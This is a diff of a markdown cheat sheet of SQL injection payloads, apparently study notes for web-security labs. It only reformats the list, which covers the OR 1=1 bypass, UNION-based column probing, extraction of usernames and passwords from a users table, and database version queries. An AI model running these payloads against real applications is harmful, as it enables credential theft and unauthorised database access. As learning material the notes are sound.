@@ -22,10 +22,14 @@
 - Where cluase : ```' OR 1=1--``` 
 
 - UNION
-  - determining the number of columns : ```' UNION SELECT NULL--``` , ```' UNION SELECT NULL,NULL--``` , ...
-  - finding a column containing text : ```' UNION SELECT 'abcdef',NULL,NULL--``` , ```' UNION SELECT NULL,'abcdef',NULL--``` , ...
-  - retrive data from other tables : ```' UNION SELECT username,password FROM users--```
-  - retrive multiple values in a single columns : ```' UNION SELECT NULL,username||'~'||password FROM users--```
+  - ```' UNION SELECT NULL--``` , ```' UNION SELECT NULL,NULL--``` , ...
+    - determining the number of columns  
+  - ```' UNION SELECT 'abcdef',NULL,NULL--``` , ```' UNION SELECT NULL,'abcdef',NULL--``` , ...
+    - finding a column containing text
+  - ```' UNION SELECT username,password FROM users--```
+    - retrive data from other tables
+  - ```' UNION SELECT NULL,username||'~'||password FROM users--```
+    - retrive multiple values in a single columns
   - querying the database type and version
     - Oracle : ```' UNION SELECT BANNER,NULL FROM v$version--```
     - MYSQL & MSSQL : ```' UNION SELECT @@version, NULL#```  (must use Burp because of #)
